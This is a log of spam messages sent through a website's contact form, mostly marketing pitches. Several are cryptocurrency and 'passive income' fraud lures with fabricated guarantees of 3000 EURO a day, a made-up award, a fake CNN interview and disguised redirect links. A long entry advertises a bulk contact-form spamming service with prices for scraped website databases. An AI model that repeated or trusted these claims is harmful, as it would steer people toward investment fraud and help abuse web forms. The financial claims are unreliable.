As a thank you for reading my message and a way to hopefully provide some value for you, can I invite you to take my completely free, no strings attached fill in the blanks professional sales letter template that can be used for traditonal sales pages and letters, video sales letters and persuasive website content. Just go to Mysalesscripter.com now.

I specialise in fill in the blanks sales script templates and bespoke scripts using hall of fame copywriter principles to take the headache and guess work out of content creation for you. 

In addition to custom and template sales letters, I also provide custom and templated:

1. Full email series to establish your client relationships and maximise sales

2. Sales phone call scripts to hit your sales targets 

4. Crazy converting website sales copy 

5. Attention grabbing Google adword
 and Facebook ads

6. Slick, memorable video sales letters

7. Lead grabbing optin pages and sales boosting upsell scripts

8. Professional webinar presentations and webinar promotion material

9. Attention getting headlines and call to actions (CTA)

10. Complete product follow up email series

11. Blog content creation and management 

12. Ebook creation

If you be interested in checking out some samples of my work please visit Mysalesscripter.com. You can also pick up your completely free sales script template you can use to drive leads and sales right away.

I am passionate about bringing usually reserved for big corporations to smaller, often family run, operations. 

Thank you very much.

With best regards,

Jay McDonald
Jayson@Mysalesscripter.com

Sales Script Scribe at https://Mysalesscripter.com

If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/m?d=esyray.com
+++ 2021-04-30 09:31:07 AM -- Email from: Eleanore Coull, -- subject: Contact Us - Your site needs to be upgraded to Antispam, -- email: coull.eleanore@msn.com, -- Message is: Good Afternoon people at esyray.com,
Hope you’re excellent. 
I'm , I hope that business is profitable and you’ve been achieving a lot throughout the current situation.
I think your internet site is not protected against unwanted messages, that’s not cool, you have to prevent leakages, I mean literally. 
https://iseo-shop.com/captcha
Kind regards,

P.S. We offer the top IT services you may order on our online shop, still not enthusiastic about getting clients? Here is an easy, 1-click unsubscribe link: https://iseo-shop.com/?unsubscribe=esyray.com
+++ 2021-04-30 10:30:35 AM -- Email from: JamesHeArf, -- subject: Passive income from 3000 EURO. Join and Become Rich with our unique system., -- email: krabborg@yahoo.com, -- Message is: Passive income from 3000 EURO. Join and Become Rich with our unique system. 
 
Our system is an exclusive group for people who believed and got involved in the madness of Bitcoin and made a fortune on it. 
Our members enjoy a worldwide vacation every month while making money on their laptop with just a few minutes of “work” every day. 
Each new member starts earning from 3000 EURO on the very first day. Forget loans and hated jobs. soon you will not have them because you will soon become rich. 
We also have 5 participants who, on the very first day, earned from 100,000 EURO each. This is a very excellent indicator. 
Don't waste time, register and start making good money right now. 
 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1s9At&amp;sa=D&amp;Jw=Di&amp;usg=AFQjCNFFD9Vnbmm2xL30VK6KG_im0pARlg 
 
There is no other trading application in the world like our system that gives 99.4% accuracy. 
Therefore, our members from all over the world trust us to double and triple their hard earned money. 
The program was created by the most advanced trading technologies in the world. 
The program is ahead of the market by 0.01 seconds. 
This 'leaping time' allows our system to be the most accurate and fastest program in the world. 
Due to this, you will receive passive income from 3000 EURO per day. 
Don't waste time, register and start making good money right now. 
 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1s9At&amp;sa=D&amp;Ja=Ad&amp;usg=AFQjCNFFD9Vnbmm2xL30VK6KG_im0pARlg 
 
Our app has won numerous awards. 
We were recently honored to receive the '# 1' award in the Trade Program category from the US Trade Association. 
Once your registration is accepted, you automatically become a new user of the system. 
You will be able to use the trading system for free. 
Like any other business, you need start-up capital to get started. 
To start making profit with the system, you must invest 250 EURO or more. 
Don't waste time, register and start making good money right now. 
 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1s9At&amp;sa=D&amp;Jo=Da&amp;usg=AFQjCNFFD9Vnbmm2xL30VK6KG_im0pARlg 
 
Click 'trade' to enjoy accurate and automated trading based on a winning algorithm. 
You can also switch the system to manual mode if you prefer to trade yourself. 
But we give a guarantee that in automatic mode your income will be from 3000 EURO per day. 
Don't waste time, register and start making good money right now. 
 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1s9At&amp;sa=D&amp;Ni=Sy&amp;usg=AFQjCNFFD9Vnbmm2xL30VK6KG_im0pARlg
+++ 2021-04-30 10:40:36 AM -- Email from: Kimberly Bradley, -- subject: Introduction, -- email: kimberly+brad3@fixhacksite.com, -- Message is: Dear Sir/Madam,

I'm sorry to trouble you. Would you be so kind as to tell me who is responsible for website optimization and security for esyray.com and how I might get in touch with them?

I have  done a  site  optimization  as well as a  speed audit on your site esyray.com, if you would  be interested in the  results please let me know and I will  send it over to you.

Thank you

With best regards
Kim Bradley
Kimberly@fixhacksite.com

Website Protector at  Https://fixhacksite.com

If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/f?d=esyray.com
+++ 2021-04-30 04:42:47 PM -- Email from: Janet Luke, -- subject: Forget about Bitcoin. Buy this instead., -- email: luke.janet@gmail.com, -- Message is: While the mainsteam media is talking &quot;Bitcoin Bitcoin Bitcoin&quot;, it is not a good idea to buy bitcoin now.

Reason? It has gone up quite a lot and has lesser room to grow.

If you are going to take high risk with your money in cryptocurrency, it is reasonable to expect high returns.

How high?

We believe this coin Kin can potentially give you a x10 or even x100 from the currenct price.

Yes, Im talking about a 10 or even potentially 100 bagger here.

A $100 can be turned into a $1000 or $10,000.

A $10,000 invested in Kin might even nett you a MILLION DOLLARS!

Kin coin (https://kin.org/) is also currenctly not listed on Binance (the world's biggest cryptocurrency exchange and Coinbase (recently listed in NASDAQ).

Coins which list of each of the exchanges have been known to go up in prices and Kin is a coin that has such high potential.

For more details on WHY Kin has such potential, we suggest you invest the next 15 mins of your time reading this:

https://medium.com/@ghosttype01/why-kin-will-be-a-100b-network-7fce59a08cfe

To buy Kin, you can sign up for a free account here at FTX and get 5% off your trading fees!
Click here for details: https://bit.ly/3nkbLSa
+++ 2021-04-30 10:13:20 PM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-05-01 02:40:34 PM -- Email from: RichardInows, -- subject: Passive income from 3000 EURO. Join and Become Rich with our unique system., -- email: enricosommer@freenet.de, -- Message is: Our system is an exclusive group for people who believed and got involved in the madness of Bitcoin and made a fortune on it. 
Our members enjoy a worldwide vacation every month while making money on their laptop with just a few minutes of “work” every day. 
Each new member starts earning from 3000 EURO on the very first day. Forget loans and hated jobs. soon you will not have them because you will soon become rich. 
We also have 5 participants who, on the very first day, earned from 100,000 EURO each. This is a very excellent indicator. 
Don't waste time, register and start making good money right now. 
 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1vioi&amp;sa=D&amp;Ki=Xw&amp;usg=AFQjCNFLclIyfyHFrFRX3HlmOdWKlAPzmA
+++ 2021-05-01 03:17:13 PM -- Email from: Rosa Loder, -- subject: Follow us in our journey in turning USD$1000 to ONE MILLION DOLLARS, -- email: loder.rosa@msn.com, -- Message is: The biggest trend to make money in 2021 (and beyond) is in cryptocurrencies like Bitcoin, Ethereum and XRP.

There are literally thousands of coins. And 2021 is a crazy year for cryptos where crazy gains are being made.

The single biggest problem faced by everyone is the sheer volume of new information exploding daily!

Below is a list of the biggest development in crypto land in the last week:


1. https://cointelegraph.com/news/japanese-gaming-giant-nexon-invests-100m-into-bitcoin

2. https://decrypt-co.cdn.ampproject.org/c/s/decrypt.co/69323/damn-huge-germany-opens-up-to-institutional-crypto-funds?amp=1

3. https://decrypt.co/69409/defi-nft-booms-send-metamask-past-5-million-active-users

4. https://www.cnbc.com/2021/04/28/sec-delays-decision-on-approving-bitcoin-etf.html


We are excited and we have something interesting for you. We created a Telegram groupchat ( you can download the app Telegram here: https://telegram.org/) for you.

In this groupchat, we are NOT selling you anything (although we do post affiliate links from time to time) to share with you the latest update in crypto world. Actionable info which can potentially make you money.

No courses, no selling and no nosense.

In this groupchat, we will also be documenting in an experiment of how we will try to turn USD$1000 into USD$1000,000 (ONE MILLION)

Join us in our Telegram group to follow our journey in getting to 1 million dollars!
https://t.me/kaizenomic
+++ 2021-05-01 09:07:13 PM -- Email from: Kimberley B, -- subject: quick question, -- email: kimberly+brad3@fixhacksite.com, -- Message is: Hello,

I'm sorry to trouble you. Would you be so kind as to tell me who is responsible for website optimization and security for esyray.com and how I might get in touch with them?

I have  done a  site  optimization and  speed audit on your  website esyray.com, if you would like the findings please let me know and I will  send it over to you.

Thank you very much

Best regards
Kim Bradley
Kimberly@fixhacksite.com

Website Protector at  Https://fixhacksite.com

If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/f?d=esyray.com
+++ 2021-05-02 03:27:12 AM -- Email from: Van Stacey, -- subject: , -- email: stacey.van@outlook.com, -- Message is: We can get real human traffic keyword targeted specifically for your niche delivered to your site in less than 48 hours! Money back guarantee. Buy high converting website visitors completely risk free now: http://www2.keywordtargetedwebtraffic.com
+++ 2021-05-02 09:06:12 AM -- Email from: Joey N, -- subject: I want to send you 26 blog post templates, -- email: joey+newman4@myblogposters.com, -- Message is: Hi,

My name is Joey from MyBlogPosters.com.

I am reaching out to let you know that I am giving away 26 professional level blog post templates (worth $297) for your site. You can use them to drammatically speed up creating user engaging content for esyray.com, in any niche you like.

Blog post templates

The “How to” Blog Post

The “Tips” Blog Post

The “FAQ” Blog Post

The “Resources” Blog Post

The “Top Mistakes” Blog Post

The “Rant” Blog Post

The “Encyclopedia” Blog Post

The “Promotional” Blog Post

The “Press Release” Blog Post

The “Motivational” Blog Post

The “News” Blog Post

The “SEO” Blog Post

The “How To” Blog Post

The “Product Review” Blog Post

The “Tips” Blog Post

The “List” Blog Post

The “FAQ” Blog Post

The “Case Study” Blog Post

The “Instructional” Blog Post

The “Multi-Part” Blog Post

The “Critical” Blog Post

The “Greatest Hits” Blog Post

The “Response” Blog Post

The “Groundbreaking” Blog Post

The “Product Comparison” Blog Post

The “Promotional” Blog Post

If this is of interest to you, please visit https://myblogposters.com/ where you can grab your 26 free blog post templates now. 

Thanks for your time. 

With best regards
Joey Newman

joey@myblogposters.com

Article Artist  at https://myblogposters.com/

If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/mbp?d=esyray.com
+++ 2021-05-03 01:31:15 PM -- Email from: Mike Bargeman, -- subject: Increase Domain Strength for esyray.com, -- email: see-email-in-message@monkeydigital.co, -- Message is: Hi there 
 
Do you want a quick boost in ranks and sales for your esyray.com website? 
Having a high DA score, always helps 
 
Get your esyray.com to have a DA between 50 to 60 points in Moz with us today and rip the benefits of such a great feat. 
 
See our offers here: 
https://www.monkeydigital.co/product/moz-da50-seo-plan/ 
 
NEW: 
https://www.monkeydigital.co/product/ahrefs-DR50-UR70/ 
 
 
thank you 
Mike Bargeman
 
support@monkeydigital.co
+++ 2021-05-04 02:32:01 AM -- Email from: Theodore Dollery, -- subject: Boost your online business presence with 1mln backlinks, -- email: dollery.theodore@gmail.com, -- Message is: Hey 
Hope you’re great, and that the company is good.
The only service you'll need to improve your business:
https://best-marketers.com/backlinks-generator
Regards,

P.S. We offer the most effective marketing services you may find on our online shop, still not interested in getting new customers? Here is a quick, 1-click unsubscribe link:  https://best-marketers.com/?unsubscribe=esyray.com
+++ 2021-05-04 10:00:39 PM -- Email from: Lara Gorton, -- subject: Important, -- email: lara@bizvideo.link, -- Message is: Hey, great site!

Have you thought about adding a video in response to COVID-19?

We can make one for you: 
https://www.bizvideo.link/success/?=esyray.com

Customers are worried right now. A short video like this can make a big impact for your business in the long term. People will remember it!

Be well,
Lara

P.S. Due to coronavirus, we have also lowered our prices by up to 55%. 






- This commercial message sent from PJLK Marketing LC
410 E Santa Clara Street STE 817
San Jose, CA 95113

To unsubscribe click here:
https://bizvideo.link/out.php/?site=esyray.com
+++ 2021-05-05 01:02:13 AM -- Email from: Brentrob, -- subject: This housewife makes over $ 1,000,000 a month., -- email: annaoma@arcor.de, -- Message is: This housewife makes over $ 1,000,000 a month. 
She makes millions of dollars doing almost nothing. CNN interviewed her how she does it, in the end she named 5 services with which she makes passive income. 
Below we will give an excerpt from her interview and list 5 services on which she makes millions of dollars without doing anything. 
An excerpt from the interview: &quot;... I am sure that I was very lucky, this is much cooler than the lottery, because I am confident in the future, 
because every day I earn more than $ 35,000 and for this I only invested $ 5000, $ 1000 in each of five services and pressed the start button ... 
there is nothing easier how to invest and press the start button and then every day receive tens of thousands of dollars of passive income ... &quot; 
Five services on which a housewife earns millions of dollars a month by investing once and pressing the start button: 
# 1 Service - Register Now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1zTyj&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHZfOPKGVlcnav4-AbmcYguQJPTpQ 
# 2 Service - Register Now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc18HMH&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFl_tOEDFdzXNzrmLTcScDQWV6Qlg 
# 3 Service - Register now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1zNSL&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNF83M2DwgUkzpORFzXiiurKchh9iw 
# 4 Service - Register now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1zNUT&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHgBjYc2z-cwzkpEAi2Aj5FthezpA 
# 5 Service - Register now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1zNW1&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFYE6BcTfiRaLBuYajWnB9XliGiwQ
+++ 2021-05-05 01:11:23 PM -- Email from: Francis Jamieson, -- subject: Voice search, -- email: francis.jamieson@alexabusinessdirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://alexabusinessdirectory.link/abcc1/?=esyray.com


 

 
Francis















 
2764 Pleasant Road Suite        Suite A PMB 708        Fort Mill        SC        29708

You can skip future marketing messages here:
https://alexabusinessdirectory.link/out.php?site=esyray.com
+++ 2021-05-05 02:13:13 PM -- Email from: contactlzcnwr, -- subject: We will send viacontact configurations to the sites of companies via any countries of the world., -- email: kypelskajapetrjaka1989@rambler.ru, -- Message is: Good whatever time of day it is where you are! 
 
Sending newsletters via  forms into the &quot;Contact us&quot; section to the sites of business organizations via all countries of the world in all languages.  
 
Your letter is sent to E-mail of firm 100 percent will get to inbox folder! 
 
2000 bases: 
https://xn----7sbb1bbndheurc1a.xn--p1ai/prajs-list/ 
 
Test: 
20000 messages on foreign zones to your E-mail - twenty dollars. 
We need from You only E-mail, title and text of the letter. 
 
In our price there are more 800 databases for all countries of the world. 
Common databases: 
All Europe 44 countries 60726150 of sites - 1100$ 
All European Union 28 countries 56752547 of sites- 1000$ 
All Asia 48 countries 14662004 of domains - 300$ 
All Africa 50 countries 1594390 of domain names - 200$ 
All North and Central America in 35 countries 7441637 of domains - 300$ 
All South America 14 countries 5826884 of sites - 200$ 
New domain names from around the world registered 24-48 hours ago. (A cycle of 15 mailings during the month) - 500$ 
Businesses of RF 4025015 - 300$ 
Ukraine 1114526 of domain names - 100$ 
All Russian-speaking countries minus Russia are 14 countries and there are 1979217 of domain names - 200$ 
New domains of the Russian Federation, registered 24-48 hours ago (A cycle of 15 mailings during the month) - 250$ 
 
Databases: 
WHOIS databases of domains for all nations of the world. 
You can purchase our databases separately from newsletter's service at the request. 
 
P.S. 
Please, do not respond to this letter from your mailbox, as it has been generated automatically and will not get anywhere! 
Contact Feedback form =» https://xn----7sbb1bbndheurc1a.xn--p1ai/to-order/ 
 
PRICE LIST: 
 
Test mailing: $20 – 20000 contact forms websites 
 
All Europe 44 countries there are 60726150 websites – $1100 
 
All EU 28 countries there are 56752547 websites – $1000 
 
All Asia 48 countries there are 14662004 websites – $500 
 
All Africa 50 countries there are 1594390 websites – $200 
 
All North and Central America is 35 countries there are 7441637 websites – $300 
 
All South America 14 countries there are 5826884 websites – $200 
 
Top 1 Million World’s Best websites – $100 
 
Top 16821856 the most visited websites in the world – $300 
 
New websites from around the world registered 24-48 hours ago. (A cycle of 15 mailings during the month) – 500$ 
 
Businesses and organizations of the Russian Federation – there are 4025015 websites – $300 
 
All Russian-speaking countries minus Russia – there are 14 countries and 2440822 websites – $200 
 
New websites of the Russian Federation, registered 24-48 hours ago. (A cycle of 15 mailings during the month) – 250$ 
 
1499203 of hosting websites around the world (there are selections for all countries, are excluded from databases for mailings) – $150 
 
295285 websites of public authorities of all countries of the world (selections for all countries, are excluded from databases for mailings) – $100 
 
3516251 websites online stores Worldwide – $250 
 
CMS mailings: 
 
3dCart 14689 websites - $50 
Adobe CQ5 133567 websites - $80 
Advance 17589 websites - $50 
AdVantShop.NET 2453 websites - $30 
ALMA 7095 websites - $30 
Ametys 2389 websites - $30 
Amiro 29587 websites - $30 
Angora 20357 websites - $50 
AVS 1369 websites - $30 
BbPress 1487 websites - $30 
BESTWEB 2699 websites - $30 
BigCommerce 78257 websites - $50 
Bitrix 319687 websites - $80 
Blogger 658267 websites - $80 
Blogspot 279865 websites - $80 
BuddyPress 51477 websites - $50 
Burning Board 4659 websites - $30 
Catalyst Web 11689 websites - $50 
ClassiPress 11796 websites - $50 
CMSimple 11052 websites - $30 
Concrete5 72100 websites - $50 
Contao 110897 websites - $80 
CONTENIDO 5069 websites - $30 
Convio 2268 websites - $30 
Coppermine Photo 1296 websites - $30 
CS Cart 11400 websites - $30 
Datalife Engine	42587 websites - $50 
Dede 230589 websites - $100 
DedeEIMS 96068 websites - $50 
DIAFAN 4058 websites - $30 
Discuz 47962 websites - $50 
Django 71167 websites - $50 
DokuWiki 9588 websites - $30 
Dotnetnuke 82964 websites - $50 
Drupal 978298 websites - $100 
EasyBlog 1165978 websites - $100 
EPiServer 29876 websites - $50 
ExpressionEngine 1769823 websites - $150 
eZ Publish 5367 websites - $30 
F- 9356 websites - $30 
FireBoard 1567 websites - $30 
General Blogs 2067 websites - $30 
GetSimple 23094 websites - $50 
Host 6871 websites - $30 
HostCMS	5042 websites - $30 
HubSpot 31762 websites - $50 
i- 9438 websites - $30 
Image 1368 websites - $30 
InSales 14149 websites - $50 
InSales	 11081 websites - $30 
InstantCMS 4136 websites - $30 
InteractiveBBS 32367 websites - $50 
Invision Power Board 2430 websites - $30 
IPBoard 2266 websites - $30 
IT 15189 websites - $50 
jforum 1056 websites - $30 
jobberBase 3387 websites - $30 
Joomla K2 154367 websites - $80 
Joomla	 1906994 websites - $200 
Koobi 3722 websites - $30 
Liferay	 5137 websites - $30 
Made Simple 20567 websites - $50 
Magento	 369447 websites - $80 
MediaMaxScript 103896 websites - $80 
MediaWiki 41468 websites - $50 
Microsoft SharePoint 13198 
MODx	 64023 websites - $50 
Moodle 8195 websites - $30 
Movable Type 13096 websites - $50 
MyBB 4367 websites - $30 
myUPB 3397 websites - $30 
NetCat	 7294 websites - $30 
NG 18356 websites - $50 
NING 3687 websites - $30 
NopCommerce 18600 websites - $30 
Open 5916 websites - $30 
OpenCart 667000 websites - $80 
Osclass 4652 websites - $30 
osCommerce 68468 websites - $50 
OUR- 3096 websites - $30 
OXID eShop 12200 websites - $50 
Oxwall 6800 websites - $30 
Parallels Plesk Sitebuilder 174216 websites - $80 
php 14367 websites - $50 
php Link 2298 websites - $30 
phpBB	 24400 websites - $30 
PHP-Fusion 2596 websites - $30 
PHPMelody 2365 websites - $30 
PHP-Nuke 2489 websites - $30 
PHPShop 2667 websites - $30 
PHPWeb 29789 websites - $50 
PHPWind 4032 websites - $30 
Plone 84962 websites - $50 
PowerEasy 1697 websites - $30 
Prestashop 434100 websites - $80 
Question2Answer 5598 websites - $30 
R 296498 websites - $80 
ReadyScript 6487682 websites - $80 
S.Builder 394367 websites - $80 
Shopify	 6093709 sites websites - $400 
Shoutbox 145564 websites - $80 
SilverStripe 31721 websites - $50 
Simpla 17429 websites - $50 
Sitecore 74861 websites - $50 
Sitefinity 4183 websites - $30 
SMF 8111 websites - $30 
SocialGO 54267 websites - $50 
SPIP 28269 websites - $50 
Squarespace 1098231 websites - $100 
StoreLand 8257 websites - $30 
SupeSite 12367 websites - $50 
Textpattern 10900 websites - $30 
TikiWiki 1446 websites - $30 
Tilda 47396 websites - $50 
Tumblr 302357 websites - $80 
TYPO3 845009 websites - $80 
Umbraco 146064 websites - $80 
UMI.CMS	 13191 websites - $50 
VamShop 1737 websites - $30 
vBulletin 14460 websites - $30 
Volusion 16006 websites - $50 
WallpaperSiteScript 2811 websites - $30 
Weebly 191753 websites - $80 
Wix 3379081 sites websites - $250 
WooCommerce 4459525 websites - $310 
Wordpress 35354537 websites - $650 
XenForo 21105 websites - $30 
XOOPS 20467 websites - $50 
XpressEngine 8565 websites - $30 
Zen Cart 26524 websites - $30 
 
Country: 
 
.ae 200462 websites UAE - $50 
.ae 1820 websites International zone UAE:.com .net .biz .info .name .tel 
.ag 11931 websites Antigua and Barbuda - $50 
.ai 33130 websites Anguilla - $50 
.am 21995 websites Armenia - $50 
.am 1684 websites International zone Armenia:.com .net .biz .info .name .tel 
.ar 782608 websites Argentina - $80 
.ar 75496 websites International zone Argentina:.com .net .biz .info .name .tel .mobi .asia-$50 
.ar.com 135 websites - $30 
.at 1356722 websites Austria - $100 
.at 181907 websites International zone Austria :.com .net .biz .info .name 
.au 2432174 websites Australia - $150 
.au 461279 websites International zone Australia:.com .net .biz .info .name 
.az 17855 websites Azerbaijan - $50 
.az 2036 websites International zone Azerbaijan:.com .net .biz .info .name .tel .mobi .asia-$30 
.ba 15725 websites Bosnia and Herzegovina - $30 
.ba 2291 websites international zone Bosnia and Herzegovina:.com.net.biz.info.org.name.tel.mobi.asia-$30 
.be 1349658 websites Belgium - $100 
.be 1056248 websites International zone Belgium:.com .net .biz .info .name 
.bg 54418 websites Bulgaria - $50 
.bg 50685 websites International zone Bulgaria:.com .net .biz .info .name 
.bo 2602 websites Bolivia - $30 
.bo 29415 websites International zone Bolivia:.com .net .biz .info .name .tel .mobi .asia-$50 
.br 3205100 websites Brazil - $200 
.br 1230078 websites International zone Brazil:.com .net .biz .info .name . 
.by 99148 websites Belarus - $50 
.by 1574 websites International zone Belarus:.com .net .biz .info .name .tel 
.ca 2587463 websites Canada - $150 
.ca 288395 websites International zone Canada:.com .net .biz .info .name 
.cc 436396 websites - $80 
.cc 1920589 websites Cocos Keeling Islands- $150 
.cf 2461460 websites Central African Republic - $150 
.cg 526 websites Congo - $30 
.ch 1629450 websites Switzerland - $100 
.ch 205292 websites International zone Switzerland:.com .net .biz .info .name .tel .mobi .asia-$50 
.ci 5794 websites Cote d'Ivoire - $30 
.ci 112 websites International zone Cote d'Ivoire:.com .net .biz .info .name 
.cl 590401 websites Chile - $80 
.cl 65996 websites International zone Chile:.com .net .biz .info .name .tel .mobi .asia-$50 
.cm 29221 websites Cameroon- $50 
.cn 23160610 websites China - $600 
.cn 1372416 websites International zone China:.com .net .biz .info .name .tel .mobi .asia-$100 
.co 1878923 websites Colombia - $100 
.co 10854 websites International zone Colombia:.com .net .biz .info .name .tel .mobi .asia-$30 
.cx 15753 websites Christmas Island - $50 
.cy 11092 websites Cyprus - $50 
.cy 744 websites International zone Cyprus:.com .net .biz .info .name .tel .mobi .asia-$30 
.cz 1001208 websites Czech Republic - $100 
.cz 193400 websites International zone Czech Republic:.com .net .biz .info .name .tel .mobi .asia-$50 
.de 15078512 websites Germany - $350 
.de 3894156 websites International zone Germany:.com .net .biz .info .name .tel .mobi .asia-$150 
.dk 1319155 websites Denmark - $100 
.dk 148164 websites International zone Denmark:.com .net .biz .info .name .tel .mobi .asia-$50 
.dm 23318 websites Dominica - $50 
.dn.ua 1835 websites - $30 
.do 5255 websites Dominican Republic- $30 
.dy.fi 1112 websites - $30 
.dz 5382 websites Algeria - $30 
.ec 11731 websites Ecuador - $50 
.ec 2897 websites International zone Ecuador:.com .net .biz .info .name .tel .mobi .asia-$30 
.ee 131791 websites Estonia- $50 
.ee 10490 websites International zone Estonia:.com .net .biz .info .name .tel .mobi .asia-$30 
.es 1509048 websites Spain - $100 
.es 683845 websites International zone Spain:.com .net .biz .info .name .tel .eu 3046076 websites Europe - $150 
.eu 633384 websites International zone Europe:.com .net .biz .info .name .fi 361111 websites Finland - $80 
.fi 69631 websites International zone Finland:.com .net .biz .info .name .fr 2810983 websites France - $150 
.fr 639546 websites International zone France:.com .net .biz .info .name .ge 24598 websites Georgia - $50 
.ge 1676 websites International zone Georgia:.com .net .biz .info .name .tel .gf 996 websites French Guiana - $30 
.gg 10528 websites Guernsey islands - $50 
.gh 703 websites Ghana - $30 
.gi 981 websites Gibraltar - $30 
.gp 2044 websites Guadeloupe - $30 
.gq 2027422 websites Equatorial Guinea - $100 
.gr 327215 websites Greece - $80 
.gr 57984 websites International zone Greece:.com .net .biz .info .name .tel .mobi .asia-$150 
.gt 15351 websites Guatemala - $50 
.hk 116093 websites Hong Kong - $50 
.hm 335 websites Heard &amp; McDonald islands - $30 
.hn 4732 websites Honduras - $30 
.hr 75736 websites Croatia - $50 
.hr 16592 websites International zone Croatia:.com .net .biz .info .name .tel .mobi .asia 
.ht 1299 websites Haiti - $30 
.hu 53940 websites International zone Hungary:.com .net .biz .info .name .tel .mobi .asia-$50 
.ie 209620 websites Ireland - $50 
.ie 49861 websites International zone Ireland:.com .net .biz .info .name .il 196266 websites Israel - $80 
.il 38537 websites International zone Israel:.com .net .biz .info .name .tel .in 1157482 websites India - $100 
.in 266179 websites International zone India:.com .net .biz .info .name .tel .io 496216 websites British Indian Ocean - $80 
.iq 2401 websites Iraq - $30 
.ir 574258 websites Iran - $80 
.ir 15487 websites International zone Iran:.com .net .biz .info .name .tel .mobi .asia 
.it 2410105 websites Italy – $150 
.it 954040 websites International zone Italy:.com.net.biz.info.org.name.tel.mobi.asia-$100 
.je 3016 websites Ireland - $30 
.jp 1825219 websites Japan - $150 
.jp 4683252 websites International zone Japan:.com.net.biz.info.org.name.tel.mobi.asia-$200 
.jp.net 5170 websites - $30 
.ke 14677 websites Kenya - $50 
.kg 10350 websites Kyrgyzstan - $30 
.kg 664 websites International zone Kyrgyzstan:.com .net .biz .info .name .tel .mobi .asia-$30 
.ki 79 websites Kiribati - $30 
.kn 3211 websites Saint Kitts and Nevis - $30 
.kr 272463 websites Korea- $80 
.kw 484 websites Kuwait - $30 
.ky 5783 websites Cayman Islands - $30 
.kz 113180 websites Kazakhstan - $80 
.kz 5876 websites International zone Kazakhstan:.com .net .biz .info .name .tel .mobi .asia-$30 
.lc 1121 websites Saint Lucia - $30 
.lk 32654 websites Sri Lanka - $30 
.lt 137666 websites Lithuania- $50 
.lt 27710 websites International zone Lithuania:.com .net .biz .info .name .tel .mobi .asia- $50 
.lu 74322 websites Luxembourg - $50 
.lu 4125 websites International zone Luxembourg:.com .net .biz .info .name .tel .mobi .asia-$30 
.lv 86593 websites Latvia - $50 
.lv 8887 websites International zone Latvia:.com .net .biz .info .name .tel .mobi .asia-$30 
.ma 59103 websites Morocco - $50 
.mc 3046 websites Monaco - $30 
.md 16730 websites Moldova - $50 
.md 1293 websites International zone Moldova:.com .net .biz .info .name .tel .mobi .asia-$30 
.me 761596 websites Montenegro - $80 
.me 86897 websites International zone Montenegro:.com .net .biz .info .name .tel .mobi .asia-$50 
.mg 3715 websites Madagascar- $30 
.mk 13266 websites Macedonia - $50 
.ml 2158835 websites Mali - $100 
.mn 17044 websites Mongolia - $50 
.mq 1112 websites Martinique (French) - $30 
.mr 776 websites Mauritania - $30 
.ms 7265 websites Montserrat - $30 
.mt 1402 websites Malta - $30 
.mu 6475 websites Maurifius - $30 
.mv 1996 websites Maldives - $30 
.mw 8579 websites Malawi - $30 
.mx 670901 websites Mexico- $80 
.mx 174571 websites International zone Mexico:.com .net .biz .info .name .tel .mobi .asia-$50 
.my 143039 websites Malaysia- $50 
.na 1094 websites - $30 
.nc 3497 websites New Coledonia (French) - $30 
.nl 3925784 websites Netherlands - $200 
.nl 1019697 websites International zone Netherlands:.com .net .biz .info .name .tel .mobi .asia-$100 
.no 620882 websites Norway - $80 
.no 74318 websites International zone Norway:.com .net .biz .info .name .tel .mobi .asia-$50 
.nu 255161 websites Niue- $50 
.nz 593127 websites New Zealand - $80 
.om 1701 websites Oman - $30 
.pe 83224 websites Peru - $50 
.pe 59157 websites International zone Peru:.com .net .biz .info .name .tel .mobi .asia-$50 
.pk 44464 websites Pakistan - $50 
.pl 1795299 websites Poland - $100 
